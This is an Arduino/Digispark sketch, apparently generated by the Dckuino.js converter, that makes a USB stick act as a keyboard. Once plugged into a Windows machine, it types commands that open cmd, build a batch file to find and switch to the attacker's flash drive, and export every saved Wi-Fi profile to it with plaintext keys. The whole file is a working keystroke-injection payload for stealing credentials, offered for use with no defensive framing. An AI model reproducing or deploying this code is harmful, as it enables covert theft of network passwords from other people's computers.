/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include <avr/pgmspace.h>
#include "DigiKeyboard.h"
const char line1[] PROGMEM = "cmd";
const char line2[] PROGMEM = "echo set pathh=>FileTemp.cmd";
const char line3[] PROGMEM = "echo set name=>>FileTemp.cmd";
const char line4[] PROGMEM = "echo set USB=>>FileTemp.cmd";
const char line5[] PROGMEM = "echo for %%a in (D E F G I J K L M N O P Q R S) do if exist %%a:\\FlashDisk.ID (>>FileTemp.cmd";
const char line6[] PROGMEM = "echo   set USB=%%a>>FileTemp.cmd";
const char line7[] PROGMEM = "echo   goto Next>>FileTemp.cmd";
const char line8[] PROGMEM = "echo )>>FileTemp.cmd";
const char line9[] PROGMEM = "echo :Next>>FileTemp.cmd";
const char line10[] PROGMEM = "echo %USB%:>>FileTemp.cmd";
const char line11[] PROGMEM = "echo DEL %pathh%%name% >> FileTemp.cmd";
const char line12[] PROGMEM = "FileTemp.cmd";
const char line13[] PROGMEM = "mkdir WiFi-Key";
const char line14[] PROGMEM = "netsh wlan export profile folder=%CD%\\WiFi-Key key=clear";
const char line15[] PROGMEM = "exit";

char buffer[256];

#define GetPsz(x) (strncpy_P(buffer, (char*)x, 256))
#define KEY_UP_ARROW    0x52
#define KEY_DOWN_ARROW  0x51
#define KEY_LEFT_ARROW    0x50
#define KEY_RIGHT_ARROW   0x4F
#define KEY_LEFT_GUI      0xE3
#define KEY_ESC       0x29
#define KEY_TAB       0x2B

void digiBegin() {
  DigiKeyboard.sendKeyStroke(0,0);
  DigiKeyboard.delay(50);
}

void digiEnd() {
  const int led=1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(1000);
  }
}

void printText(char *txt) {
  DigiKeyboard.print(txt);
  DigiKeyboard.update();
}

void setup() {
  digiBegin();

  DigiKeyboard.delay(300);

  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT|MOD_GUI_LEFT);

  DigiKeyboard.delay(300);

  // cmd
  printText(GetPsz(line1));

  DigiKeyboard.delay(300);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(800);

  DigiKeyboard.delay(300);

  // echo set pathh=>FileTemp.cmd
  printText(GetPsz(line2));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);

  // echo set name=>>FileTemp.cmd
  printText(GetPsz(line3));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);

  // echo set USB=>>FileTemp.cmd
  printText(GetPsz(line4));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);

  // echo for %%a in (D E F G I J K L M N O P Q R S) do if exist %%a:\\FlashDisk.ID (>>FileTemp.cmd
  printText(GetPsz(line5));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);

  // echo   set USB=%%a>>FileTemp.cmd
  printText(GetPsz(line6));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);

  // echo   goto Next>>FileTemp.cmd
  printText(GetPsz(line7));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);

  // echo )>>FileTemp.cmd
  printText(GetPsz(line8));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);

  // echo :Next>>FileTemp.cmd
  printText(GetPsz(line9));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);

  // echo %USB%:>>FileTemp.cmd
  printText(GetPsz(line10));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);

  // echo DEL %pathh%%name% >> FileTemp.cmd
  printText(GetPsz(line11));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);

  // FileTemp.cmd
  printText(GetPsz(line12));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);

  // mkdir WiFi-Key
  printText(GetPsz(line13));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);

  // netsh wlan export profile folder=%CD%\\WiFi-Key key=clear
  printText(GetPsz(line14));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);

  // exit
  printText(GetPsz(line15));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  digiEnd();

}
/* Unused endless loop */
void loop() {}
